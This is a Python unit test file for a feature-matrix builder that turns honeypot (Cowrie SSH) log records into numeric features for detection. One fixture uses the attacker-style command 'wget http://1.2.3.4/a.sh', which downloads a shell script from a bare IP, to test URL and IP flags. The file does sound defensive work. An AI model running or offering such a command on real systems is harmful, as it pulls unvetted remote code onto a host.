"""Isolated unit tests for FeatureMatrixBuilder / FeatureMatrix.

Uses directly constructed DatasetRecord objects. Requires no Cowrie,
no Docker, no network, no database, no real log files, and no other
external services.
"""

from core.ai_engine.feature_extractor import FeatureVector
from core.ai_engine.feature_matrix import FEATURE_NAMES, FeatureMatrixBuilder
from core.dataset_manager.builder import DatasetRecord


def _make_record(**overrides) -> DatasetRecord:
    defaults = dict(
        timestamp="2026-08-19T18:00:22.557428Z",
        source_ip="127.0.0.1",
        session_id="ce82815367a4",
        protocol="ssh",
        honeypot="Cowrie",
        event_type="cowrie.command.input",
        category="command_execution",
        severity="low",
        command="pwd",
        has_command=True,
        command_length=3,
        has_url=False,
        has_ip_address=False,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    defaults.update(overrides)
    return DatasetRecord(**defaults)


class _RecordingExtractor:
    """Fake FeatureExtractor that records what it was asked to extract."""

    def __init__(self):
        self.extracted_records = []

    def extract(self, record):
        self.extracted_records.append(record)
        return FeatureVector(
            command_length=record.command_length,
            has_command=int(record.has_command),
            has_url=int(record.has_url),
            has_ip_address=int(record.has_ip_address),
            has_file_path=int(record.has_file_path),
            has_shell_metacharacters=int(record.has_shell_metacharacters),
        )


def test_one_dataset_record_produces_one_matrix_row():
    matrix = FeatureMatrixBuilder().build([_make_record()])
    assert len(matrix.rows) == 1


def test_multiple_records_produce_multiple_rows():
    records = [
        _make_record(command="pwd"),
        _make_record(command="ls"),
        _make_record(command="id"),
    ]
    matrix = FeatureMatrixBuilder().build(records)
    assert len(matrix.rows) == 3


def test_input_order_is_preserved():
    records = [
        _make_record(command="pwd", command_length=3),
        _make_record(command="whoami", command_length=6),
        _make_record(command="ls -la", command_length=6),
    ]
    matrix = FeatureMatrixBuilder().build(records)
    lengths = [row[FEATURE_NAMES.index("command_length")] for row in matrix.rows]
    assert lengths == [3, 6, 6]


def test_generator_input_works():
    def record_generator():
        yield _make_record(command="pwd")
        yield _make_record(command="ls")

    matrix = FeatureMatrixBuilder().build(record_generator())
    assert len(matrix.rows) == 2


def test_feature_extractor_is_actually_used():
    fake_extractor = _RecordingExtractor()
    records = [_make_record(command="pwd"), _make_record(command="ls")]

    FeatureMatrixBuilder(extractor=fake_extractor).build(records)

    assert fake_extractor.extracted_records == records


def test_feature_names_are_fixed_and_ordered_correctly():
    matrix = FeatureMatrixBuilder().build([_make_record()])
    assert matrix.feature_names == (
        "command_length",
        "has_command",
        "has_url",
        "has_ip_address",
        "has_file_path",
        "has_shell_metacharacters",
    )


def test_empty_input_produces_zero_rows_with_correct_feature_names():
    matrix = FeatureMatrixBuilder().build([])
    assert matrix.rows == []
    assert matrix.feature_names == FEATURE_NAMES


def test_feature_values_are_integers():
    matrix = FeatureMatrixBuilder().build([_make_record()])
    row = matrix.rows[0]
    assert all(isinstance(value, int) for value in row)


def test_same_input_produces_identical_matrix():
    records = [_make_record(command="pwd")]
    first = FeatureMatrixBuilder().build(records)
    second = FeatureMatrixBuilder().build(records)
    assert first == second


def test_dataset_records_are_not_modified():
    record = _make_record(command="pwd", command_length=3, has_command=True)
    original_command = record.command
    original_length = record.command_length

    FeatureMatrixBuilder().build([record])

    assert record.command == original_command
    assert record.command_length == original_length


def test_combined_observable_features_appear_in_correct_positions():
    record = _make_record(
        command="wget http://1.2.3.4/a.sh",
        command_length=26,
        has_command=True,
        has_url=True,
        has_ip_address=True,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    matrix = FeatureMatrixBuilder().build([record])
    row = matrix.rows[0]

    assert row[FEATURE_NAMES.index("command_length")] == 26
    assert row[FEATURE_NAMES.index("has_command")] == 1
    assert row[FEATURE_NAMES.index("has_url")] == 1
    assert row[FEATURE_NAMES.index("has_ip_address")] == 1
    assert row[FEATURE_NAMES.index("has_file_path")] == 0
    assert row[FEATURE_NAMES.index("has_shell_metacharacters")] == 0


def test_dependency_injection_works_with_fake_extractor():
    fake_extractor = _RecordingExtractor()
    records = [_make_record(command="pwd")]

    matrix = FeatureMatrixBuilder(extractor=fake_extractor).build(records)

    assert fake_extractor.extracted_records == records
    assert len(matrix.rows) == 1